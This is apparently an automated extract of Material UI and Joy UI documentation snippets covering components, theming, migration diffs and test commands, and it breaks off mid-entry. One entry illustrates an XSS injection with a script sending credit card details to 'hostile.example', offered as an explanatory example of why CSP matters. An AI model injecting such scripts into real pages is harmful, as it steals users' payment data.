import FolderIcon from '@mui/icons-material/Folder';
import RestoreIcon from '@mui/icons-material/Restore';
import FavoriteIcon from '@mui/icons-material/Favorite';
import LocationOnIcon from '@mui/icons-material/LocationOn';

export default function LabelBottomNavigation() {
  const [value, setValue] = React.useState('recents');

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };

  return (
    <BottomNavigation sx={{ width: 500 }} value={value} onChange={handleChange}>
      <BottomNavigationAction
        label="Recents"
        value="recents"
        icon={<RestoreIcon />}
      />
      <BottomNavigationAction
        label="Favorites"
        value="favorites"
        icon={<FavoriteIcon />}
      />
      <BottomNavigationAction
        label="Nearby"
        value="nearby"
        icon={<LocationOnIcon />}
      />
      <BottomNavigationAction label="Folder" value="folder" icon={<FolderIcon />} />
    </BottomNavigation>
  );
}

----------------------------------------

TITLE: Demonstrating XSS Attack Vector in HTML
DESCRIPTION: Example showing how a malicious script could be injected without CSP protection

LANGUAGE: html
CODE:
<script>
  sendCreditCardDetails('https://hostile.example');
</script>

----------------------------------------

TITLE: Basic Grid Import and Usage - React/JSX
DESCRIPTION: Shows the basic import statement and explains that column widths are integer values between 1 and 12, where size={6} takes up half the container width.

LANGUAGE: jsx
CODE:
import Grid from '@mui/joy/Grid';

----------------------------------------

TITLE: Integrating font optimization in Next.js Pages Router
DESCRIPTION: Shows how to integrate Next.js font optimization with Material UI in the _app.tsx file for Pages Router.

LANGUAGE: typescript
CODE:
import * as React from 'react';
import Head from 'next/head';
import { AppProps } from 'next/app';
import { AppCacheProvider } from '@mui/material-nextjs/v15-pagesRouter';
import { ThemeProvider, createTheme } from '@mui/material/styles';
import { Roboto } from 'next/font/google';

const roboto = Roboto({
  weight: ['300', '400', '500', '700'],
  subsets: ['latin'],
  display: 'swap',
  variable: '--font-roboto',
});

const theme = createTheme({
  typography: {
    fontFamily: 'var(--font-roboto)',
  },
});

export default function MyApp(props: AppProps) {
 const { Component, pageProps } = props;
 return (
   <AppCacheProvider {...props}>
     <Head>...</Head>
     <ThemeProvider theme={theme}>
       <main className={roboto.variable}>
         <Component {...pageProps} />
       </main>
     </ThemeProvider>
   </AppCacheProvider>
 );
}

----------------------------------------

TITLE: Installing Material UI Icons with Yarn
DESCRIPTION: Command to install Material UI Icons and Material UI packages using Yarn. Includes a workaround for dependency resolution.

LANGUAGE: bash
CODE:
yarn add @mui/icons-material @mui/material

LANGUAGE: json
CODE:
{
  "dependencies": {
    "@mui/material": "npm:@mui/joy@latest"
  },
  "resolutions": {
    "@mui/material": "npm:@mui/joy@latest"
  }
}

----------------------------------------

TITLE: Customizing Badge Slot Props
DESCRIPTION: Demonstrates how to pass custom props to internal Badge slots.

LANGUAGE: jsx
CODE:
<Badge slotProps={{ badge: { className: 'my-badge' } }} />

----------------------------------------

TITLE: Hook Slot Props Combination Pattern
DESCRIPTION: Shows how to combine multiple slot prop resolvers using the combineHooksSlotProps utility.

LANGUAGE: typescript
CODE:
const createHandleClick = (otherHandlers: EventHandlers) => (event: React.KeyboardEvent) => {
  /* ... */
}

const { getRootProps as getListRootProps } = useList(/* ... */);
const getOwnRootEventHandlers = (otherHandlers: EventHandlers = {}) => ({
  onClick: createHandleClick(otherHandlers),
});

const getRootProps = <TOther extends EventHandlers>(
    otherHandlers: TOther = {} as TOther,
): UseAwesomeControlRootSlotProps => {
    const getCombinedRootProps = combineHooksSlotProps(getOwnRootEventHandlers, getListRootProps);
    return {
      ...getCombinedRootProps(otherHandlers),
      role: 'combobox'
    }
  }

----------------------------------------

TITLE: Basic Button Group Implementation - React
DESCRIPTION: Basic example showing how to implement Button Group with Button and IconButton components.

LANGUAGE: jsx
CODE:
import BasicButtonGroup from './BasicButtonGroup.js'

----------------------------------------

TITLE: HTML Structure of Radio Component
DESCRIPTION: This snippet illustrates the HTML structure of the Radio component. It's composed of nested span elements for the radio button, icon, action (with a nested input), and its associated label.

LANGUAGE: html
CODE:
<span class="MuiRadio-root">
  <span class="MuiRadio-radio">
    <span class="MuiRadio-icon"></span>
    <span class="MuiRadio-action">
      <input class="MuiRadio-input">
    </span>
  </span>
  <label class="MuiRadio-label">
</span>

----------------------------------------

TITLE: Updating Keyframes Animation Syntax
DESCRIPTION: Scope the keyframes API by prefixing the animation name with $ in JSS styles.

LANGUAGE: diff
CODE:
rippleVisible: {
  opacity: 0.3,
-   animation: 'mui-ripple-enter 100ms cubic-bezier(0.4, 0, 0.2, 1)',
+   animation: '$mui-ripple-enter 100ms cubic-bezier(0.4, 0, 0.2, 1)',
},
'@keyframes mui-ripple-enter': {
  '0%': {
    opacity: 0.1,
  },
  '100%': {
    opacity: 0.3,
  },
},

----------------------------------------

TITLE: Running MUI End-to-End Tests
DESCRIPTION: A table of commands for running end-to-end tests in the MUI project. It includes commands for full test runs, development mode, and individual steps like building and serving test fixtures.

LANGUAGE: markdown
CODE:
| command                | description                                                                                   |
| :--------------------- | :-------------------------------------------------------------------------------------------- |
| `pnpm test:e2e`        | Full run                                                                                      |
| `pnpm test:e2e:dev`    | Prepares the fixtures to be able to test in watchmode                                         |
| `pnpm test:e2e:run`    | Runs the tests (requires `pnpm test:e2e:dev` or `pnpm test:e2e:build`+`pnpm test:e2e:server`) |
| `pnpm test:e2e:build`  | Builds the webpack bundle for viewing the fixtures                                            |
| `pnpm test:e2e:server` | Serves the fixture bundle.                                                                    |

----------------------------------------

TITLE: Importing and Using Menu Components in React
DESCRIPTION: This snippet demonstrates how to import and use the basic Menu components from Joy UI. It includes the Dropdown, MenuButton, Menu, and MenuItem components to create a simple menu structure.

LANGUAGE: jsx
CODE:
import Menu from '@mui/joy/Menu';
import MenuButton from '@mui/joy/MenuButton';
import MenuItem from '@mui/joy/MenuItem';
import Dropdown from '@mui/joy/Dropdown';

export default function MyApp() {
  return (
    <Dropdown>
      <MenuButton>Actions</MenuButton>
      <Menu>
        <MenuItem>Add item</MenuItem>
      </Menu>
    </Dropdown>
  );
}

----------------------------------------

TITLE: Updating withTheme import and usage
DESCRIPTION: Change withTheme import to @mui/styles and wrap with ThemeProvider.

LANGUAGE: diff
CODE:
-import { withTheme } from '@mui/material/styles';
+import { withTheme } from '@mui/styles';
+import { createTheme, ThemeProvider } from '@mui/material/styles';

+const theme = createTheme();
  const MyComponent = withTheme(({ theme }) => <div>{theme.direction}</div>);

  function App(props) {
-  return <MyComponent />;
+  return <ThemeProvider theme={theme}><MyComponent {...props} /></ThemeProvider>;
  }

----------------------------------------

TITLE: Importing Radio Component in React
DESCRIPTION: This snippet shows how to import the Radio component from Joy UI. It's the basic setup required to use Radio buttons in a React application.

LANGUAGE: jsx
CODE:
import Radio from '@mui/joy/Radio';

----------------------------------------

TITLE: Handling Snackbar Close Event in React
DESCRIPTION: Example of handling the onClose event of a Snackbar, including access to the close reason.

LANGUAGE: js
CODE:
<Snackbar onClose={(event, reason) => {
  // reason will be one of: timeout, clickaway, escapeKeyDown
}}>

----------------------------------------

TITLE: Testing No Console Errors in React Components
DESCRIPTION: Example showing how to test that a component does not produce any console errors.

LANGUAGE: javascript
CODE:
function SomeComponent({ variant }) {
  if (process.env.NODE_ENV !== 'production') {
    if (variant === 'unexpected') {
      console.error("That variant doesn't make sense.");
    }
    if (variant !== undefined) {
      console.error('`variant` is deprecated.');
    }
  }

  return <div />;
}
expect(() => {
  render(<SomeComponent />);
}).not.toErrorDev();

----------------------------------------

TITLE: Triggering Input Focus Ring Programmatically
DESCRIPTION: Shows how to trigger the input's focus ring programmatically by setting a CSS variable.

LANGUAGE: css
CODE:
--Input-focused: 1

----------------------------------------

TITLE: Creating Left-Positioned Timeline in React
DESCRIPTION: Shows how to position the main content of the timeline on the left side relative to the time axis.

LANGUAGE: jsx
CODE:
{"demo": "LeftPositionedTimeline.js"}

----------------------------------------

TITLE: Creating Basic MUI Transitions
DESCRIPTION: Example of using theme.transitions.create() helper to create transitions for multiple CSS properties

LANGUAGE: javascript
CODE:
theme.transitions.create(['background-color', 'transform']);

----------------------------------------

TITLE: Controlling Badge Visibility with invisible Prop
DESCRIPTION: This snippet shows how to use the invisible prop to control the Badge's visibility. It can be used to dynamically show or hide the Badge based on certain conditions.

LANGUAGE: jsx
CODE:
<Badge badgeContent={4} invisible={!badgeVisible}>
  <Mail />
</Badge>

----------------------------------------

TITLE: Original Import Statements in TSX
DESCRIPTION: Example of import statements before the plugin transformation, showing the Node.js resolution style without explicit extensions.

LANGUAGE: tsx
CODE:
// packages/mui-material/build/index.js
export * from './Accordion';

// packages/mui-material/build/Breadcrumbs/BreadcrumbCollapsed.js
import MoreHorizIcon from '../internal/svg-icons/MoreHoriz';

----------------------------------------

TITLE: Customizing Slider Slots in React
DESCRIPTION: Examples of customizing the Slider component structure using slots and slotProps.

LANGUAGE: jsx
CODE:
<Slider slots={{ root: 'div', thumb: 'div' }} />

LANGUAGE: jsx
CODE:
<Slider slotProps={{ rail: { className: 'my-rail' } }} />

----------------------------------------

TITLE: Importing ChipDelete Component for Delete Functionality in React
DESCRIPTION: This code snippet shows how to import the ChipDelete component, which is used to add delete functionality to a Chip. The ChipDelete component is designed to work in conjunction with the Chip component.

LANGUAGE: jsx
CODE:
import ChipDelete from '@mui/joy/ChipDelete';

----------------------------------------

TITLE: Using Component Prop with List in React
DESCRIPTION: Illustrates how to use the component prop to change the root element of a List component from <ul> to <menu>.

LANGUAGE: jsx
CODE:
<List component="menu">
  <ListItem>
    <ListItemButton>
      <ListItemText primary="Trash" />
    </ListItemButton>
  </ListItem>
  <ListItem>
    <ListItemButton>
      <ListItemText primary="Spam" />
    </ListItemButton>
  </ListItem>
</List>

----------------------------------------

TITLE: Flat props vs sx prop in Typography
DESCRIPTION: Comparison of using flat props and sx prop for styling Typography component

LANGUAGE: jsx
CODE:
<Typography color="grey.600">

// is equivalent to
<Typography sx={{ color: 'grey.600' }}>

----------------------------------------

TITLE: Importing MUI Shadow Utilities
DESCRIPTION: Shows how to import the shadows utility from the MUI system package. This import provides access to the shadow functionality for use in components.

LANGUAGE: js
CODE:
import { shadows } from '@mui/system';

----------------------------------------

TITLE: Wrapping Icon Component in React
DESCRIPTION: Demonstrates how to wrap a Material UI Icon component while preserving its muiName property for proper functionality.

LANGUAGE: jsx
CODE:
const WrappedIcon = (props) => <Icon {...props} />;
WrappedIcon.muiName = Icon.muiName;

----------------------------------------

TITLE: Implementing Opposite Content Timeline in React
DESCRIPTION: Shows how to display content on opposite sides of the timeline.

LANGUAGE: jsx
CODE:
{"demo": "OppositeContentTimeline.js"}

----------------------------------------

TITLE: HTML Structure of Switch Component
DESCRIPTION: Illustrates the HTML structure of the Switch component, including its root element and interior slots.

LANGUAGE: html
CODE:
<span class="base-Switch-root">
  <span class="base-Switch-track"></span>
  <span class="base-Switch-thumb"></span>
  <input type="checkbox" class="base-Switch-input" />
</span>

----------------------------------------

TITLE: Testing Console Error Handling in React Components
DESCRIPTION: Example demonstrating how to test components that produce console errors and warnings using custom matchers toErrorDev.

LANGUAGE: jsx
CODE:
function SomeComponent({ variant }) {
  if (process.env.NODE_ENV !== 'production') {
    if (variant === 'unexpected') {
      console.error("That variant doesn't make sense.");
    }
    if (variant !== undefined) {
      console.error('`variant` is deprecated.');
    }
  }

  return <div />;
}
expect(() => {
  render(<SomeComponent variant="unexpected" />);
}).toErrorDev(["That variant doesn't make sense.", '`variant` is deprecated.']);

----------------------------------------

TITLE: Numeric Spacing with Theme Number
DESCRIPTION: Demonstrates spacing transformation when theme.spacing is a number value. The input is multiplied by the theme value to calculate final spacing.

LANGUAGE: jsx
CODE:
const theme = {
  spacing: 8,
}

<Box sx={{ m: -2 }} /> // margin: -16px;
<Box sx={{ m: 0 }} /> // margin: 0px;
<Box sx={{ m: 0.5 }} /> // margin: 4px;
<Box sx={{ m: 2 }} /> // margin: 16px;

----------------------------------------

TITLE: Migrating Circular Progress Component
DESCRIPTION: Diff showing the changes required to migrate the Circular Progress component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import CircularProgress from 'material-ui/CircularProgress';
+import CircularProgress from '@material-ui/core/CircularProgress';

-<CircularProgress mode="indeterminate" />
+<CircularProgress variant="indeterminate" />

----------------------------------------

TITLE: Numeric Spacing with Theme Number
DESCRIPTION: Demonstrates spacing transformation when theme.spacing is a number value. The input is multiplied by the theme value to calculate final spacing.

LANGUAGE: jsx
CODE:
const theme = {
  spacing: 8,
}

<Box sx={{ m: -2 }} /> // margin: -16px;
<Box sx={{ m: 0 }} /> // margin: 0px;
<Box sx={{ m: 0.5 }} /> // margin: 4px;
<Box sx={{ m: 2 }} /> // margin: 16px;

----------------------------------------

TITLE: Using Styled Components API in React
DESCRIPTION: Shows how to use the styled function from @mui/styles to create a styled Material UI Button component.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { styled } from '@mui/styles';
import Button from '@mui/material/Button';

const MyButton = styled(Button)({
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
  border: 0,
  borderRadius: 3,
  boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',
  color: 'white',
  height: 48,
  padding: '0 30px',
});

export default function StyledComponents() {
  return <MyButton>Styled Components</MyButton>;
}

----------------------------------------

TITLE: Auto-layout Grid
DESCRIPTION: Demonstrates the auto-layout feature where grid items equitably share available space. It also shows how setting the width of one item causes others to automatically resize around it.

LANGUAGE: JavaScript
CODE:
{"demo": "AutoGrid.js", "bg": true}

----------------------------------------

TITLE: Animating Floating Action Buttons with Zoom Transition in React
DESCRIPTION: Demonstrates how to animate Floating Action Buttons (FAB) using the Zoom transition effect. This example likely includes code for smooth enter and exit animations with proper timing.

LANGUAGE: jsx
CODE:
"FloatingActionButtonZoom.js"

----------------------------------------

TITLE: Creating Custom Box Component with MUI System
DESCRIPTION: Shows how to create a custom Box component using the createBox utility, allowing for use with a different theme.

LANGUAGE: javascript
CODE:
import { createBox, createTheme } from '@mui/system';

const defaultTheme = createTheme({
  // your custom theme values
});

const Box = createBox({ defaultTheme });

export default Box;

----------------------------------------

TITLE: Configuring MUI Transition Durations
DESCRIPTION: Configuration example showing how to customize transition duration values in the theme. Defines various duration presets in milliseconds for different types of animations.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  transitions: {
    duration: {
      shortest: 150,
      shorter: 200,
      short: 250,
      // most basic recommended timing
      standard: 300,
      // this is to be used in complex animations
      complex: 375,
      // recommended when something is entering screen
      enteringScreen: 225,
      // recommended when something is leaving screen
      leavingScreen: 195,
    },
  },
});

----------------------------------------

TITLE: Controlling Badge Visibility with showZero Prop
DESCRIPTION: This snippet shows how to use the showZero prop to control the visibility of the Badge when its content is zero. By default, the Badge is hidden when badgeContent is 0.

LANGUAGE: jsx
CODE:
<Badge badgeContent={0} showZero>
  <Mail />
</Badge>

----------------------------------------

TITLE: Implementing Custom Switch Component with MUI Base Hook in TypeScript
DESCRIPTION: Demonstrates how to create a custom Switch component using the useSwitch hook from MUI Base. The hook provides state and accessibility props which are applied to custom DOM elements.

LANGUAGE: typescript
CODE:
function MySwitch(props: UseSwitchParameters) {
  const { getInputProps, checked, disabled } = useSwitch(props);

  return (
    <span className={clsx('root', { checked, disabled })}>
      <span className="thumb" />
      <input className="input" {...getInputProps()} />
    </span>
  );
}

----------------------------------------

TITLE: Creating Custom SVG Icons
DESCRIPTION: Example of using createSvgIcon utility to create custom icon components

LANGUAGE: jsx
CODE:
const HomeIcon = createSvgIcon(
  <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />,
  'Home',
);

// or with custom SVG
const PlusIcon = createSvgIcon(
  <svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    viewBox="0 0 24 24"
    strokeWidth={1.5}
    stroke="currentColor"
    className="h-6 w-6"
  >
    <path strokeLinecap="round" strokeLinejoin="round" d="M12 4.5v15m7.5-7.5h-15" />
  </svg>,
  'Plus',
);

----------------------------------------

TITLE: Box Component Width Percentage Examples
DESCRIPTION: Examples demonstrating the use of percentage-based widths with the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ width: '25%' }}>…
<Box sx={{ width: '50%' }}>…
<Box sx={{ width: '75%' }}>…
<Box sx={{ width: '100%' }}>…
<Box sx={{ width: 'auto' }}>…

----------------------------------------

TITLE: Using usePagination Hook Implementation - React/MUI
DESCRIPTION: Implementation example referenced in the documentation for using the usePagination hook. The actual code implementation is shown in a demo file named 'UsePagination.js' but not provided in the text.

LANGUAGE: jsx
CODE:
// Reference to UsePagination.js demo
// Actual implementation not shown in the provided text

----------------------------------------

TITLE: Generating Comprehensive Switch Component Styles
DESCRIPTION: This snippet demonstrates a more comprehensive theme generated by the Sync plugin for a fully customized Switch component. It includes styles for various states, sizes, and interactions.

LANGUAGE: javascript
CODE:
{
  components: {
    MuiSwitch: {
      styleOverrides: {
        root: {
          '&.MuiSwitch-sizeMedium:has(.MuiSwitch-colorPrimary)': {
            width: '40px',
            height: '21px',
            padding: '0',
            '& .MuiSwitch-switchBase': {
              padding: '0',
              '& .MuiSwitch-thumb': {
                width: '17px',
                height: '17px',
                background: '#FAFAFA',
              },
              '& + .MuiSwitch-track': {
                width: '38px',
                height: '21px',
                borderRadius: '100px',
                opacity: '1',
              },
            },
            '&:not(:has(.Mui-checked)):not(:has(.Mui-disabled)):not(:has(.Mui-focusVisible))': {
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(3px) translateY(2px)',
                '& + .MuiSwitch-track': {
                  background: '#BDBDBD',
                },
              },
            },
            '&:not(:has(.Mui-checked)):has(.Mui-disabled):not(:has(.Mui-focusVisible))': {
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(3px) translateY(2px)',
                '& + .MuiSwitch-track': {
                  background: 'rgba(229, 229, 229, 0.99)',
                },
              },
            },
            '&:not(:has(.Mui-checked)):not(:has(.Mui-disabled)):has(.Mui-focusVisible)': {
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(3px) translateY(2px)',
                '& + .MuiSwitch-track': {
                  border: '1px solid #000',
                  background: '#BDBDBD',
                },
              },
            },
            '&:has(.Mui-checked):has(.Mui-disabled):not(:has(.Mui-focusVisible))': {
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(19px) translateY(2px)',
                '& + .MuiSwitch-track': {
                  background: 'rgba(187, 231, 188, 0.99)',
                },
              },
            },
            '&:not(:has(.Mui-checked)):not(:has(.Mui-disabled)):not(:has(.Mui-focusVisible)):hover': {
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(3px) translateY(2px)',
                '& + .MuiSwitch-track': {
                  background: '#616161',
                },
              },
            },
            '&:has(.Mui-checked):not(:has(.Mui-disabled)):not(:has(.Mui-focusVisible))': {
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(19px) translateY(2px)',
                '& + .MuiSwitch-track': {
                  background: 'var(--mui-palette-success-light)',
                },
              },
            },
            '&:has(.Mui-checked):not(:has(.Mui-disabled)):not(:has(.Mui-focusVisible)):hover': {
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(19px) translateY(2px)',
                '& + .MuiSwitch-track': {
                  background: 'var(--mui-palette-success-dark)',
                },
              },
            },
            '&:has(.Mui-checked):not(:has(.Mui-disabled)):has(.Mui-focusVisible)': {
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(19px) translateY(2px)',
                '& + .MuiSwitch-track': {
                  border: '1px solid #000',
                  background: 'var(--mui-palette-success-light)',
                },
              },
            },
          },
        },
      },
    },
  },
}

----------------------------------------

TITLE: Migrating Menu Item Component
DESCRIPTION: Diff showing the changes required to migrate the Menu Item component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import MenuItem from 'material-ui/MenuItem';
+import MenuItem from '@material-ui/core/MenuItem';

-<MenuItem primaryText="Profile" />
+<MenuItem>Profile</MenuItem>

----------------------------------------

TITLE: Array-based Spacing Theme
DESCRIPTION: Shows spacing transformation when theme.spacing is an array. The input value is used as an index to look up the spacing value.

LANGUAGE: jsx
CODE:
const theme = {
  spacing: [0, 2, 3, 5, 8],
}

<Box sx={{ m: -2 }} /> // margin: -3px;
<Box sx={{ m: 0 }} /> // margin: 0px;
<Box sx={{ m: 2 }} /> // margin: 3px;

----------------------------------------

TITLE: Setting HTML Direction via JavaScript
DESCRIPTION: Alternative method to set RTL direction using JavaScript DOM manipulation.

LANGUAGE: javascript
CODE:
document.documentElement.setAttribute('dir', 'rtl');

----------------------------------------

TITLE: Configuring Themes in Pigment CSS
DESCRIPTION: Shows how to define and use themes in Pigment CSS, including color schemes and CSS variables.

LANGUAGE: javascript
CODE:
import { withPigment, extendTheme } from '@pigment-css/nextjs-plugin';

export default withPigment(nextConfig, {
  theme: extendTheme({
    colors: {
      primary: 'tomato',
      secondary: 'cyan',
    },
    spacing: {
      unit: 8,
    },
    typography: {
      fontFamily: 'Inter, sans-serif',
    },
    colorSchemes: {
      light: {
        colors: {
          background: '#f9f9f9',
          foreground: '#121212',
        },
      },
      dark: {
        colors: {
          background: '#212121',
          foreground: '#fff',
        },
      },
    },
    getSelector: (colorScheme) => colorScheme ? `.theme-${colorScheme}` : ':root',
  }),
});

----------------------------------------

TITLE: Generating Switch Component Styles with Material UI Sync
DESCRIPTION: This snippet shows the theme code generated by the Sync plugin for a customized Switch component. It includes style overrides for various states and sizes of the Switch.

LANGUAGE: javascript
CODE:
{
  components: {
    MuiSwitch: {
      styleOverrides: {
        root: {
          '&.MuiSwitch-sizeMedium:has(.MuiSwitch-colorPrimary)': {
            '&:has(.Mui-checked):not(:has(.Mui-disabled)):not(:has(.Mui-focusVisible))': {
              width: '40px',
              height: '21px',
              padding: '0',
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(19px) translateY(2px)',
                padding: '0',
                '& .MuiSwitch-thumb': {
                  width: '17px',
                  height: '17px',
                  background: '#FAFAFA',
                },
                '& + .MuiSwitch-track': {
                  width: '38px',
                  height: '21px',
                  background: 'var(--mui-palette-success-light)',
                  opacity: '1',
                },
              },
            },
          },
        },
      },
    },
  },
}

----------------------------------------

TITLE: Forwarding Refs in Class Components with React.forwardRef
DESCRIPTION: Shows how to use React.forwardRef with class components to avoid warnings in StrictMode related to ReactDOM.findDOMNode deprecation.

LANGUAGE: jsx
CODE:
 class Component extends React.Component {
   render() {
-    const { props } = this;
+    const { forwardedRef, ...props } = this.props;
     return <div {...props} ref={forwardedRef} />;
   }
 }

-export default Component;
+export default React.forwardRef((props, ref) => <Component {...props} forwardedRef={ref} />);

----------------------------------------

TITLE: Implementing Woven Image List in React
DESCRIPTION: This example illustrates the creation of a woven image list that uses alternating container ratios to create a rhythmic layout. It's ideal for browsing peer content.

LANGUAGE: JSX
CODE:
{"demo": "WovenImageList.js"}

----------------------------------------

TITLE: Configuring Link Underline Behavior
DESCRIPTION: Shows how to use the underline prop to control the link's underline appearance, with 'always' as the default value.

LANGUAGE: JSX
CODE:
{"demo": "UnderlineLink.js"}

----------------------------------------

TITLE: Link as Button Implementation
DESCRIPTION: Demonstrates how to use the Link component as a button with click handling functionality.

LANGUAGE: js
CODE:
<Link
  component="button"
  onClick={() => {
    // ...process something
  }}
>
  Do something
</Link>

----------------------------------------

TITLE: Global class customization options in MUI
DESCRIPTION: Different ways to customize MUI components using global class names

LANGUAGE: typescript
CODE:
import TextField from '@mui/material/TextField';
import { outlinedInputClasses } from '@mui/material/OutlinedInput';
import { styled } from '@mui/material/styles';

// Option 1: global class
const CustomizedTextField1 = styled(TextField)({
  '& .MuiOutlinedInput-notchedOutline': {
    borderColor: 'red',
  },
});

// Option 2: global class + const
const CustomizedTextField2 = styled(TextField)({
  [`& .${outlinedInputClasses.notchedOutline}`]: {
    borderColor: 'red',
  },
});

// Option 3: classes prop (before)
const CustomizedTextField3 = styled((props) => (
  <TextField
    {...props}
    variant="outlined"
    InputProps={{ classes: { notchedOutline: 'foo' } }}
  />
))({
  '& .foo': {
    borderColor: 'red',
  },
}) as typeof TextField;

----------------------------------------

TITLE: Updating withStyles import and usage
DESCRIPTION: Change withStyles import to @mui/styles and wrap with ThemeProvider.

LANGUAGE: diff
CODE:
-import { withStyles } from '@mui/material/styles';
+import { withStyles } from '@mui/styles';
+import { createTheme, ThemeProvider } from '@mui/material/styles';

+const defaultTheme = createTheme();
  const MyComponent = withStyles((props) => {
    const { classes, className, ...other } = props;
    return <div className={clsx(className, classes.root)} {...other} />
  })(({ theme }) => ({ root: { background: theme.palette.primary.main }}));

  function App() {
-  return <MyComponent />;
+  return <ThemeProvider theme={defaultTheme}><MyComponent /></ThemeProvider>;
  }

----------------------------------------

TITLE: Applying Scoped CSS Baseline in Joy UI
DESCRIPTION: This snippet shows how to use the ScopedCssBaseline component to apply baseline styles only to children components. It's useful for progressive migration to Joy UI.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { CssVarsProvider } from '@mui/joy/styles';
import ScopedCssBaseline from '@mui/joy/ScopedCssBaseline';
import MyApp from './MyApp';

export default function MyApp() {
  const [root, setRoot] = React.useState(null);
  return (
    {/* target the node to ScopedCssBaseline's div */}
    <CssVarsProvider colorSchemeNode={root}>
      {/* must be used under CssVarsProvider */}
      <ScopedCssBaseline ref={(element) => setRoot(element)}>
        {/* The rest of your application */}
        <MyApp />
      </ScopedCssBaseline>
    </CssVarsProvider>
  );
}

----------------------------------------

TITLE: Migrating Raised Button Component
DESCRIPTION: Diff showing the changes required to migrate the Raised Button component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import RaisedButton from 'material-ui/RaisedButton';
+import Button from '@material-ui/core/Button';

-<RaisedButton />
+<Button variant="contained" />

----------------------------------------

TITLE: Creating Custom styled() Utility
DESCRIPTION: Demonstrates how to create a custom styled() utility with a different default theme using createStyled()

LANGUAGE: javascript
CODE:
import { createStyled, createTheme } from '@mui/system';

const defaultTheme = createTheme({
  // your custom theme values
});

const styled = createStyled({ defaultTheme });

export default styled;

----------------------------------------

TITLE: Disabling RTL for Specific Components
DESCRIPTION: Using the @noflip directive to opt out of RTL transformation for specific style rules.

LANGUAGE: javascript
CODE:
const LeftToRightTextInRtlApp = styled('div')`
  /* @noflip */
  text-align: left;
`;

----------------------------------------

TITLE: Custom Typography Scale Theme Configuration
DESCRIPTION: Example of defining custom typography scales with specific styling properties in the theme.

LANGUAGE: js
CODE:
extendTheme({
  typography: {
    subtitle: {
      fontSize: 'var(--joy-fontSize-lg)',
      fontWeight: 'var(--joy-fontWeight-md)',
      '& + p': {
        marginTop: '4px',
      },
    },
    label: {
      fontSize: 'var(--joy-fontSize-sm)',
      fontWeight: 'var(--joy-fontWeight-lg)',
      lineHeight: 'var(--joy-lineHeight-lg)',
      marginBottom: '3px',
    },
  },
});

----------------------------------------

TITLE: Creating Custom Filter for Autocomplete Options
DESCRIPTION: This example demonstrates how to create a custom filter function for Autocomplete options using the createFilterOptions utility.

LANGUAGE: javascript
CODE:
import { createFilterOptions } from '@mui/material/Autocomplete';

const filterOptions = createFilterOptions({
  matchFrom: 'start',
  stringify: (option) => option.title,
});

<Autocomplete filterOptions={filterOptions} />;

----------------------------------------

TITLE: TypeScript module augmentation for info palette
DESCRIPTION: TypeScript code to add the info palette to the theme's palette types via module augmentation.

LANGUAGE: typescript
CODE:
// You can put this to any file that's included in your tsconfig
import type { PaletteRange } from '@mui/joy/styles';

declare module '@mui/joy/styles' {
  interface ColorPalettePropOverrides {
    // apply to all Joy UI components that support `color` prop
    info: true;
  }

  interface Palette {
    // this will make the node `info` configurable in `extendTheme`
    // and add `info` to the theme's palette.
    info: PaletteRange;
  }
}

----------------------------------------

TITLE: Building Webpack Bundle for Visual Regression Tests
DESCRIPTION: This command builds the webpack bundle necessary for viewing the visual regression test fixtures.

LANGUAGE: bash
CODE:
pnpm test:regressions:build

----------------------------------------

TITLE: Adding module augmentation for DefaultTheme
DESCRIPTION: Add module augmentation for DefaultTheme when using @mui/styles with @mui/material.

LANGUAGE: typescript
CODE:
import { Theme } from '@mui/material/styles';

declare module '@mui/styles' {
  interface DefaultTheme extends Theme {}
}

----------------------------------------

TITLE: Integrating font optimization in Next.js App Router
DESCRIPTION: Demonstrates how to integrate Next.js font optimization with Material UI in the app/layout.tsx file.

LANGUAGE: javascript
CODE:
import { AppRouterCacheProvider } from '@mui/material-nextjs/v15-appRouter';
import { Roboto } from 'next/font/google';
import { ThemeProvider } from '@mui/material/styles';
import theme from '../theme';

const roboto = Roboto({
  weight: ['300', '400', '500', '700'],
  subsets: ['latin'],
  display: 'swap',
  variable: '--font-roboto',
});

export default function RootLayout(props) {
  const { children } = props;
  return (
    <html lang="en">
      <body className={roboto.variable}>
        <AppRouterCacheProvider>
          <ThemeProvider theme={theme}>
            {children}
          </ThemeProvider>
        </AppRouterCacheProvider>
      </body>
    </html>
  );
}

----------------------------------------

TITLE: Configuring Emotion with RTL Support
DESCRIPTION: Setting up Emotion's CacheProvider with RTL plugin configuration for right-to-left styling support.

LANGUAGE: jsx
CODE:
import { CacheProvider } from '@emotion/react';
import createCache from '@emotion/cache';
import { prefixer } from 'stylis';
import rtlPlugin from 'stylis-plugin-rtl';

// Create rtl cache
const cacheRtl = createCache({
  key: 'muirtl',
  stylisPlugins: [prefixer, rtlPlugin],
});

function Rtl(props) {
  return <CacheProvider value={cacheRtl}>{props.children}</CacheProvider>;
}

----------------------------------------

TITLE: Adding Custom Props to Autocomplete Root Slot in React
DESCRIPTION: These examples show how to add a custom id prop to the root slot of the Autocomplete component, both directly and using slotProps.

LANGUAGE: jsx
CODE:
<Autocomplete id="badge1">

LANGUAGE: jsx
CODE:
<Autocomplete slotProps={{ root: { id: 'badge1' } }}>

----------------------------------------

TITLE: Running Visual Regression Tests in Development Mode
DESCRIPTION: This command builds all fixtures and renders an overview page listing all fixtures for debugging individual tests in development mode.

LANGUAGE: bash
CODE:
pnpm test:regressions:dev

----------------------------------------

TITLE: Using Component Prop with TypeScript Generics
